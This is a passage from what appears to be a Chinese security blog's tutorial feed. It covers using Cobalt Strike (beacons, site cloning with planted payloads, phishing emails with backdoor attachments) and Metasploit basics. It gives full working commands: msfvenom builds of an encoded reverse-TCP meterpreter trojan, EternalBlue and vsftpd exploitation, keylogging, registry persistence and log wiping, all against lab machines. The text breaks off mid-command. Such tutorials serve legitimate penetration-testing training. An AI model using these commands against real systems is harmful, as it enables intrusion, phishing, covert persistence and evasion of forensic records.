Strike客户端连接到团队服务（Linux）</h1><p>进入CS目录</p><p><img src="/img/763fdb9573294f8e8b13188887fe801c.png" alt="image.png"></p><p>然后输入 .&#x2F;cobaltstrike  即可</p><p><img src="/img/2b7ab0a3a89e4d62aef2a1f2700f152a.png" alt="image.png"></p><p>第一次使用CS会提示权限不够</p><p><img src="/img/50f9dd89ad804e34a6aa17da343e9bc4.png" alt="image.png"></p><p>我们可以直接给cobaltstrike 赋777权限,然后在启动即课</p><p>终端内输入 chmod 777 cobaltstrike</p><p><img src="/img/83e597b74afc41d78438b7b16dba048e.png" alt="image.png"></p><p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p><p><img src="/img/675ee5966567465cb1ff2635c93a25dd.png" alt="image.png"></p><p>看到提示点击  Yes即可</p><p><img src="/img/0e5e7a66768940d9869afedf8822c4f1.png" alt="image.png"></p><p>稍等片刻即可启动完成 （如果电脑较卡启动时间会稍微有点长多等一下）</p><p><img src="/img/ef230c1ae9b044a6bbd42674b59e95d7.png" alt="image.png"></p><h1 id="6-Cobalt-Strike客户端连接团队服务（Windows）"><a href="#6-Cobalt-Strike客户端连接团队服务（Windows）" class="headerlink" title="6 Cobalt Strike客户端连接团队服务（Windows）"></a>6 Cobalt Strike客户端连接团队服务（Windows）</h1><p><strong>注意Cobalt Strike这款软件最好在虚拟机内执行避免后门反噬主机</strong></p><p>解压CS安装包</p><p><img src="/img/0793bde1003d48edb588f9a0fc4744e9.png" alt="image.png"></p><p>启动方法1 直接管理员方式执行 cobaltstrike.bat</p><p>启动方法2 在CMD中运行，注意CMD也要管理员权限</p><p><img src="/img/6df02bf4c9284e80a103c3d32bf246f5.png" alt="image.png"></p><p><img src="/img/a3f4f23a27e343248963b40253202635.png" alt="image.png"></p><p><img src="/img/bbfad5cfef1e4eceb6199c330cc0a46b.png" alt="image.png"></p><p>启动CS完成后根据服务器配置输入IP ，端口，用户名，密码</p><p><img src="/img/674fa8a677b64d738f83550ee9690670.png" alt="image.png"></p><p>看到服务器指纹确认点Yes  服务器指纹应与服务启动时一样</p><p><img src="/img/541c0b6de1fd45eda97084a4cc21b7a9.png" alt="image.png"></p><p><img src="/img/d8fdbc51c0194cc1966e3df1daef5e3f.png" alt="image.png"></p><hr><h1 id="7-Cobalt-Strik功能介绍"><a href="#7-Cobalt-Strik功能介绍" class="headerlink" title="7 Cobalt Strik功能介绍"></a>7 Cobalt Strik功能介绍</h1><p><img src="/img/df5f3a99e4f34d37addae0a7add4744a.png" alt="image.png"></p><p>图标栏功能说明</p><p>1 添加新的 Cobalt Strik 团队服务器</p><p>2 删除当前 Cobalt Strik 团队服务器</p><p>3 新建一个监听器</p><p>4 切换图形会话按钮</p><p>5 切换列表会话按钮</p><p>6  以列表方式显示目标</p><p>7 密码凭证栏按钮</p><p>8 下载文件列表</p><p>9 键盘记录表</p><p>10 屏幕截图表</p><p>11 生成Windows下可执行木马</p><p>12 生成java签名applet攻击</p><p>13 生成office 宏攻击</p><p>14 生成powershell后门</p><p>15  文件托管按钮</p><p>16 管理web站点</p><p>17 帮助文档</p><p>18 关于</p><h1 id="8-创建一个监控"><a href="#8-创建一个监控" class="headerlink" title="8  创建一个监控"></a>8  创建一个监控</h1><h2 id="8-1-监控器链接方式简介"><a href="#8-1-监控器链接方式简介" class="headerlink" title="8.1 监控器链接方式简介"></a><strong>8.1 监控器链接方式简介</strong></h2><p>beacon是cs内置的监听器，当我们在目标机器上成功执行Payload后，会返回一个shell发送到cs上。</p><p>foreign主要是提供给cs外的工具使用的监听器，例如派生出来msf的shell来进行后渗透。</p><p>External C2 是 cs引入的一种规范（或者框架），黑客可以利用这个功能拓展C2通信渠道，而不局限于默认提供的 http，https，dns，smb tcp 通道。大家可以参考 <a href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf">此处</a> 下载完整的规范说明。</p><p>简而言之， 用户可以使用这个框架来开发各种组件，包括如下组件：</p><ul><li>第三方控制端（Controller）：负责连接 Cobalt Strike TeamServer，并且能够使用自定义的 C2 通道与目标主机上的第三方客户端（Client）通信。</li><li>第三方客户端（Client）：使用自定义C2通道与第三 Controller 通信，将命令转发至 SMB Beacon。</li><li>SMB Beacon：在受害者主机上执行的标准 beacon。</li></ul><h2 id="8-2-Beacon分类"><a href="#8-2-Beacon分类" class="headerlink" title="8.2 Beacon分类"></a><strong>8.2 Beacon分类</strong></h2><p><strong>Beacon是Cobalt Strike运行在目标主机上的payload，Beacons是在隐蔽信道上给我们提供服务，用于长期控制受感染主机</strong> 。它的工作方式与Metasploit类似。在实际渗透过程中，我们可以将其 <strong>嵌入到可执行文件</strong> 、<strong>添加到Word文档</strong>或者通过<strong>利用主机漏洞</strong>来传递Beacon。</p><ol><li>DNS Beacon</li><li>HTTP 和 HTTPS Beacon</li><li>SMB Beacon</li><li>TCP Beacon</li></ol><h3 id="8-2-1-DNS-Beacon"><a href="#8-2-1-DNS-Beacon" class="headerlink" title="8.2.1 DNS Beacon"></a>8.2.1 DNS Beacon</h3><p>DNS Beacon，就是使用DNS请求将Beacon返回。DNS 请求用于解析由你的 CS 团队服务器</p><p>DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务</p><p>注意：</p><p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式</p><p>DNS Beacon优点：</p><p>拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p><p><img src="/img/24a63e41aa7446c48a138e56a7a0b282.png" alt="image.png"></p><h3 id="8-2-2-HTTP-和-HTTPS-Beacon"><a href="#8-2-2-HTTP-和-HTTPS-Beacon" class="headerlink" title="8.2.2  HTTP 和 HTTPS Beacon"></a>8.2.2  HTTP 和 HTTPS Beacon</h3><p>HTTP Beacon 利用http请求来进行通信来向受害主机传达命令，达到控制对方主机的目的。缺点是明文传输。</p><p>HTTPS Beacon 增加了加密传输，其余跟http完全相同。</p><p><img src="/img/490042b5c64d41cbba7712d349202a15.png" alt="image.png"></p><h3 id="8-2-3-SMB-Beacon"><a href="#8-2-3-SMB-Beacon" class="headerlink" title="8.2.3  SMB Beacon"></a>8.2.3  SMB Beacon</h3><p><strong>官网的解释为</strong> ：<em>SMB Beacon 使用命名管道通过父 Beacon 进行通信，这种点对点通信借助 Beacons 在同一台主机上实现，它同样也适用于外部的互联网。Windows 当中借助在 SMB 协议中封装命名管道进行通信，因此，命名为 SMB Beacon。</em></p><p>以上的说法，其实就是将 <code>Payload</code> 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可。</p><p><img src="/img/36f68a11068245a5a5c5767802ee4e9f.png" alt="image.png"></p><h3 id="8-2-4-TCP-Beacon"><a href="#8-2-4-TCP-Beacon" class="headerlink" title="8.2.4  TCP Beacon"></a>8.2.4  TCP Beacon</h3><p>TCP Beacon和SMB Beacon类似只不过TCP Beacon不是使用SMB与父Beacon进行通信而是使用TCP socket进行通信，cs4.0之后，这个技术就不适合做第一个木马使用，因为他的流量都是明文的，容易被发现但是这个技术，很适合在内网穿透的时候去使用，在内网穿透的时候一般只能使用tcp beacon去生成木马。</p><p>点击<img src="/img/4d82efac16c54a67b750be2e4cfe5360.png" alt="image.png">或 点击监听器</p><p><img src="/img/d0c92611818942deaf90391569c9a856.png" alt="image.png"></p><p><img src="/img/6e3bf526c9f74669a51a578b06375eee.png" alt="image.png"></p><p><img src="/img/492cc938cbe843168614f1fb19a5c4c4.png" alt="image.png"></p><h1 id="9-Cobalt-Strik-目标主机信息收集"><a href="#9-Cobalt-Strik-目标主机信息收集" class="headerlink" title="9  Cobalt Strik 目标主机信息收集"></a>9  Cobalt Strik 目标主机信息收集</h1><p>Cobalt Strik内置信息收集模块 可以收集 目标主机的操作系统版本 系统位数  浏览器  版本  位数</p><p>方便攻击者针对性攻击</p><p><img src="/img/41a5c1651ac9441fb18126adbe6a0d4f.png" alt="image.png"></p><p>配置信息收集  有4个参数可以设置  分别为 本地URL   本地Host  本地端口  跳转URL</p><p>本地URL    配置的参数是访问ip后面的参数</p><p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p><p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p><p>跳转URL    默认可不设置跳转</p><p><img src="/img/a6c6782c584c4858b3fb03fb0170aee6.png" alt="image.png"></p><p>靶机访问  weblog中查看</p><h1 id="10-Cobalt-Strik-克隆网页并挂马"><a href="#10-Cobalt-Strik-克隆网页并挂马" class="headerlink" title="10 Cobalt Strik 克隆网页并挂马"></a>10 Cobalt Strik 克隆网页并挂马</h1><p>克隆网页</p><p><img src="/img/888d8d4f07db487589d76b409a9a283c.png" alt="image.png"></p><h2 id="10-1-配置网站克隆"><a href="#10-1-配置网站克隆" class="headerlink" title="10.1 配置网站克隆"></a>10.1 配置网站克隆</h2><p>克隆URL  输入http网站链接</p><p>本地URL    配置的参数是访问ip后面的参数</p><p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p><p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p><p>攻击地址 ： 默认不配置</p><p><img src="/img/e0505ef1c8f3440197d821b84db7499c.png" alt="image.png"></p><p>配置完成后靶机访问  本地host地址</p><h2 id="10-2-挂马"><a href="#10-2-挂马" class="headerlink" title="10.2 挂马"></a>10.2 挂马</h2><p><img src="/img/30c3466760b74a0ca5eea3d37a65af3b.png" alt="image.png"></p><p>克隆URL  输入http网站链接</p><p>本地URL    配置的参数是访问ip后面的参数</p><p>本地Host   是当前Cobalt Strik服务器的内网或公网IP</p><p>本地端口    默认是80  如果80被占用了就需要设置其他的 如 81  82  83 都可以</p><p>攻击地址 ： 选择一个已经配置好的后面下载链接</p><p>配置完成后访问 本地host地址+ 参数 mb</p><h1 id="11-Cobalt-Strik-邮件钓鱼"><a href="#11-Cobalt-Strik-邮件钓鱼" class="headerlink" title="11  Cobalt Strik 邮件钓鱼"></a>11  Cobalt Strik 邮件钓鱼</h1><p>1 准备一个邮箱用于发送邮件</p><p>这边拿QQ邮箱为例  点击设置然后点击 账户</p><p><img src="/img/9969011be032489c8be8b39aa5e21406.png" alt="image.png"></p><p>找到 IMAP&#x2F;SMTP服务 点击开启服务 获取 授权码  （获取后把这个授权码先记录下来）</p><p><img src="/img/5c6b9d0a35a6439ea049c401ad493319.png" alt="image.png"></p><p>然后回到CS中  进入邮件钓鱼</p><p><img src="/img/dd792386511c4f028d239aaeb1cf5060.png" alt="image.png"></p><p>邮件钓鱼配置参数如下</p><p>目标 ：这里指的是接收邮件的邮箱  可以是txt文件</p><p>模板：邮件的格式和内容（可通过邮箱导出为模板）</p><p>附件： 可以加入后门程序或其他 或者不加</p><p>嵌入URL : 可以选择配置好的网站放进去</p><p>邮件服务器：</p><img src="/img/image-20230929150104748.png" alt="image-20230929150104748" style="zoom:67%;" /><p>密码是授权码</p><p><img src="/img/242bc7796dc84d26a5013b558ce7b8c9.png" alt="image.png"></p><p>退信通知邮箱 可以填写任意可接受邮件的邮箱</p><p><img src="/img/66e35b4a9f0048aaa06d3d4dc712b206.png" alt="image.png"></p><p>所有参数配置完成后 点击 Send 发送邮件即可</p><h1 id="12-将MSF会话注入Cobalt-Strik监控"><a href="#12-将MSF会话注入Cobalt-Strik监控" class="headerlink" title="12 将MSF会话注入Cobalt Strik监控"></a>12 将MSF会话注入Cobalt Strik监控</h1><h2 id="1-环境准备："><a href="#1-环境准备：" class="headerlink" title="1 环境准备："></a>1 环境准备：</h2><p>1 kali操作系统</p><p>2 Cobalt Strik 服务端和客户端</p><p>3 一个在MSF下拿到权限的靶机</p><h2 id="2-配置MSF创建监听"><a href="#2-配置MSF创建监听" class="headerlink" title="2 配置MSF创建监听"></a>2 配置MSF创建监听</h2><p>2.1 使用msf创建后门</p><p>msfvenom -a x86 –platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.0.0.150 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10  -f exe -o payload.exe</p><p>2.2  使用python创建一个web服务 然后使用靶机下载</p><p>python3 -m http.server 80</p><p>2.3 配置监控并获取meterpreter</p><p>启动msf</p><blockquote><p>msfconsole</p></blockquote><p>创建监控</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>加载payload</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>配置监控参数</p><p>show options</p><p>set lhost   监控IP</p><p>set lport   监控端口</p><p>run  执行</p><p>去靶机执行后门程序 等待返回 meterpreter</p><p>2.4 后台当前session</p><p>background</p><h2 id="3-使用CS进行监控"><a href="#3-使用CS进行监控" class="headerlink" title="3 使用CS进行监控"></a>3 使用CS进行监控</h2><p>1 加载MSF的payload 注入功能</p><p>use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</p><p>2 设置payload</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_http</p><p>3   查看配置参数</p><p>show options</p><p>set lhost 10.0.0.36</p><p>设置cs服务器地址</p><p>4 set lport 4567</p><p>设置cs监听端口</p><p>5 set session 1</p><p>设置监控会话</p><p>6 set disablepayloadhander true</p><p>设置当前msf不接受监听数据</p><p>7 run</p><p>执行设置</p><p>4 CS开始实战操作</p><h1 id="13-安装插件"><a href="#13-安装插件" class="headerlink" title="13 安装插件"></a>13 安装插件</h1><p>在cobolt strike–&gt;script中直接导入插件的cna文件即可</p><p>小tip，CS加载插件出现乱码解决办法：</p><p><a href="https://blog.csdn.net/weixin_44309905/article/details/122687310">https://blog.csdn.net/weixin_44309905/article/details/122687310</a></p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>msf基础操作</title>
    <link href="/2023/10/27/msf%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/10/27/msf%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="MSF-学习"><a href="#MSF-学习" class="headerlink" title="MSF 学习"></a>MSF 学习</h1><p>官网：<a href="https://metasploit.com/">https://metasploit.com/</a></p><h2 id="Metaspolit体系框架"><a href="#Metaspolit体系框架" class="headerlink" title="Metaspolit体系框架"></a>Metaspolit体系框架</h2><img src="/img/image-20230831211104843.png" alt="image-20230831211104843" style="zoom:67%;" /><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>模块组织按照不同的用途分为7种类型的模块 （Modules）：</p><p>分为辅助模块（Aux)、渗透攻击模块 （Exploits)、后渗透攻击模块（Post)、攻击载荷模块 （payloads)、 编码器模块（Encoders)、空指令模块（Nops)、 免杀模块(Evasion)</p><p><strong>Exploits</strong>：渗透攻击模块，利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法。</p><p><strong>Aux</strong>：辅助模块，负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能。 </p><p><strong>Post</strong>：后渗透攻击模块，在取得目标系统远程控制权限后，进行一系列的后渗透攻击 动作，如获取敏感信息、跳板攻击等操作。 </p><p><strong>Payloads</strong>：攻击载荷模块，成功exploit之后，真正在目标系统执行的代码或指令。 </p><p><strong>Encodes</strong>：编码器模块，主要对payload进行加密，最终达到躲避AntiVirus检查的目的。 </p><p><strong>Nops</strong>：空指令模块，主要作用是提高payload稳定性及维持大小。 </p><p><strong>Evasion</strong>：免杀模块，可以用来创建木马文件</p><p><img src="/img/image-20230831212047593.png" alt="image-20230831212047593"></p><h2 id="Metasploitable2-Linux靶机"><a href="#Metasploitable2-Linux靶机" class="headerlink" title="Metasploitable2-Linux靶机"></a>Metasploitable2-Linux靶机</h2><p>​Metasploitable2虚拟系统是一个特别制作的ubuntu操作系统，本身设计目的是作为安全工具测试和演示常见漏洞攻击的环境。</p><p>其中最重要的是可以用来作为MSF攻击用的靶机 开放了很多的高危端口如21、23、445等，而且具有很多未打补丁的高危漏洞， 如Samba MS-RPC Shell命令注入漏洞等，而且对外开放了很 多服务，并且数据库允许外联等。系统中的用户口令均为弱口令。系统 搭载了DVWA、Mutillidae等Web漏洞演练平台</p><p><img src="/img/image-20230831213105366.png" alt="image-20230831213105366"></p><h2 id="MSF启动"><a href="#MSF启动" class="headerlink" title="MSF启动"></a>MSF启动</h2><p>Metasploit启动有三种方式 </p><p>1.先启动Postgresql数据库 </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service postgresql <span class="hljs-literal">start</span><br>msfconsole<br></code></pre></td></tr></table></figure><p>2.直接启动 </p><p>3.启动Postgresql的同时启动Metasploit</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">msfdb <span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230901100203685.png" alt="image-20230901100203685" style="zoom: 80%;" /><img src="/img/image-20230901100235457.png" alt="image-20230901100235457" style="zoom:80%;" /><h2 id="MSF命令"><a href="#MSF命令" class="headerlink" title="MSF命令"></a>MSF命令</h2><p>rank等级</p><p><img src="/img/image-20230901110041194.png" alt="image-20230901110041194"></p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p>用于展示可用模块，有效参数是：all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info</p><p><img src="/img/image-20230901100855408.png" alt="image-20230901100855408"></p><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索 直接查找 search后直接跟要查找内容，查得很广泛 可以根据名字、路径、平台、类型、联合查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">直接搜索漏洞编号：<span class="hljs-keyword">search</span> ms08_067<br>根据名字：<span class="hljs-keyword">search</span> <span class="hljs-type">name</span>:mysql<br>根据路径：<span class="hljs-keyword">search</span> <span class="hljs-type">path</span>:mysql<br>根据模块：<span class="hljs-keyword">search</span> <span class="hljs-keyword">type</span>:exploit<br>根据平台：<span class="hljs-keyword">search</span> platform:windows<br>联合查询：<span class="hljs-keyword">search</span> <span class="hljs-type">name</span>:mysql <span class="hljs-keyword">type</span>:exploit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230901100924747.png" alt="image-20230901100924747"></p><p><img src="/img/image-20230901101029758.png" alt="image-20230901101029758"></p><p><img src="/img/image-20230901101234524.png" alt="image-20230901101234524"></p><h3 id="use"><a href="#use" class="headerlink" title="use"></a>use</h3><p>使用某一个具体的模块  以ms08_067为例 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.search ms08_067<br><span class="hljs-number">2</span>.use exploit<span class="hljs-regexp">/windows/</span>smb/ms08_067_netapi<br><span class="hljs-number">3</span>.info<span class="hljs-regexp">//</span>查看基本信息（适用的攻击目标）和需要设置哪些参数<br><span class="hljs-number">4</span>.show options   <span class="hljs-regexp">//</span>需要设置的参数<br><span class="hljs-number">5</span>.show missing   <span class="hljs-regexp">//</span>必须要设置的参数<br><span class="hljs-number">6</span>.show target    <span class="hljs-regexp">//</span>可以攻击的目标<br></code></pre></td></tr></table></figure><img src="/img/image-20230901102816207.png" alt="image-20230901102816207" style="zoom:80%;" /><img src="/img/image-20230901103045590.png" alt="image-20230901103045590" style="zoom:80%;" /><h3 id="back"><a href="#back" class="headerlink" title="back"></a>back</h3><p>退出当前调用的模块</p><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>用于设置选项中的参数  以ms08_067为例</p><p><img src="/img/image-20230901103950114.png" alt="image-20230901103950114"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">10.210.100.129</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230901104043227.png" alt="image-20230901104043227"></p><h3 id="exploit-run"><a href="#exploit-run" class="headerlink" title="exploit&#x2F;run"></a>exploit&#x2F;run</h3><p>配置好选项参数之后发起攻击</p><p><img src="/img/image-20230901104210805.png" alt="image-20230901104210805"></p><h2 id="MSF攻击流程"><a href="#MSF攻击流程" class="headerlink" title="MSF攻击流程"></a>MSF攻击流程</h2><p>已知漏洞-&gt;查找模块-&gt;配置程序-&gt;run&#x2F;exploit</p><p><img src="/img/image-20230901104652942.png" alt="image-20230901104652942"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">search</span> xxx<br>use xxx<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> payload xxx<br>run/exploit<br></code></pre></td></tr></table></figure><h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>靶机：10.210.100.131  防火墙关闭</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1.</span>搜索可利用的模块：search ms17_010<br><span class="hljs-number">2.</span>使用辅助模块检测目标是否存在漏洞:<br>use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">10.210.100.131</span><br>run<br>3.使用漏洞利用模块<br>use <span class="hljs-comment">exploit</span>/windows/<span class="hljs-comment">smb</span>/ms17_010_eternalblue<br>set RHOSTS <span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.131</span><br>run/<span class="hljs-comment">exploit</span><br>exploit <span class="hljs-comment">-j</span>   //挂在后台<br>sessions <span class="hljs-comment">-l</span>//查看后台<br>session <span class="hljs-comment">-i id</span>  //进入指定<span class="hljs-comment">id</span>的<span class="hljs-comment">meterpreter</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230901111810932.png" alt="image-20230901111810932"></p><h2 id="Metasploitable2-Linux靶机-渗透"><a href="#Metasploitable2-Linux靶机-渗透" class="headerlink" title="Metasploitable2-Linux靶机 渗透"></a>Metasploitable2-Linux靶机 渗透</h2><p>1.信息搜集</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">扫描网段：nmap -sP <span class="hljs-number">10.210.100.0</span>/<span class="hljs-number">24</span><br>扫描端口：nmap -sT <span class="hljs-number">10.210.100.129</span><br>扫描版本：nmap -sV -p <span class="hljs-number">1-65535 10</span>.<span class="hljs-number">210.100.129</span><br>扫描是否存在常见的漏洞：nmap --script=vuln <span class="hljs-number">10.210.100.129</span><br><br>msf中也可以使用nmap(前提：开启数据库)<br>命令:db_nmap -xxx<br></code></pre></td></tr></table></figure><img src="/img/image-20230901151930762.png" alt="image-20230901151930762" style="zoom:80%;" /><p>2.漏洞利用</p><p>cve官网：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">search</span> 漏洞编号/服务+版本等<br>eg:<span class="hljs-keyword">search</span> vsftpd<br><span class="hljs-keyword">search</span><br><br><span class="hljs-keyword">use</span> exploit/unix/ftp/vsftpd_234_backdoor<br><span class="hljs-keyword">set</span> RHOSTS 10.210.100.129<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230901152321393.png" alt="image-20230901152321393" style="zoom:67%;" /><img src="/img/image-20230901152610498.png" alt="image-20230901152610498" style="zoom:67%;" /><p>整体流程：</p><ul><li>根据服务和版本查询漏洞 如cve漏洞 <a href="https://cve.mitre.org/">https://cve.mitre.org/</a></li><li>查询对应的exploit模块</li><li>添加配置参数</li><li>添加payload（show payloads）</li><li>run &#x2F; exploit</li></ul><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>​Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成 功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们 返回一个控制通道。 </p><p>​使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户 密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、 得到远程控制权、捕捉按键信息、清楚应用程序、显示、远程主机的系统信息、显示远程机器的网络接口和IP地址等信息</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">background：返回，把meterpreter后台挂起sessions：查看当前建立的会话<br>ps：查看进程<br>getpid：查看当前进程号<br>sysinfo：查看系统信息<br>getsystem：自动提权<br>getuid：查看当前权限<br><span class="hljs-built_in">run</span> scraper ：获取目标主机的详细信息<br>访问文件系统：cd、cat、 rm、<span class="hljs-built_in">edit</span> <br><span class="hljs-built_in">run</span> post/windows/gather/enum_applications：先查看目标主机安装了哪些应用 <br>screenshot：屏幕截图 <br>键盘记录：keyscan_start、keyscan_dump、keyscan_stop <br><span class="hljs-built_in">run</span> vnc：屏幕监控<br>进程迁移：migrate pid（例如winlogon进程的pid，记事本的pid等）<br></code></pre></td></tr></table></figure><img src="/img/image-20230901201441615.png" alt="image-20230901201441615" style="zoom:67%;" /><img src="/img/image-20230901202344287.png" alt="image-20230901202344287" style="zoom:67%;" /><img src="/img/image-20230901203250976.png" alt="image-20230901203250976" style="zoom:67%;" /><h3 id="生成持续后门"><a href="#生成持续后门" class="headerlink" title="生成持续后门"></a>生成持续后门</h3><p>​因为meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每 次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得<strong>在目标主机系统内留下一个持续性的后门，</strong>只要目标主机开机了，我们就可以连接到该主机</p><h4 id="1-写入注册表"><a href="#1-写入注册表" class="headerlink" title="1.写入注册表"></a>1.写入注册表</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use exploit/windows/<span class="hljs-keyword">local</span>/persistence<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">set</span> STARTUP <span class="hljs-keyword">SYSTEM</span><br>run<br></code></pre></td></tr></table></figure><img src="/img/image-20230901203733969.png" alt="image-20230901203733969" style="zoom:67%;" /><p><img src="/img/image-20230901203906910.png" alt="image-20230901203906910"></p><h4 id="2-开启监听"><a href="#2-开启监听" class="headerlink" title="2.开启监听"></a>2.开启监听</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.210.100.131</span><br>run<br></code></pre></td></tr></table></figure><h4 id="3-清除日志"><a href="#3-清除日志" class="headerlink" title="3.清除日志"></a>3.清除日志</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">meterpreter中：clearev<br></code></pre></td></tr></table></figure><h2 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h2><p>msfvenom是msfpayload,msfencode的结合体，可利用 msfvenom生成木马程序,并在目标机上执行,在本地监听上线</p><h3 id="制作windows恶意程序"><a href="#制作windows恶意程序" class="headerlink" title="制作windows恶意程序"></a>制作windows恶意程序</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">60.128</span> LPORT=<span class="hljs-number">4444</span> -b <span 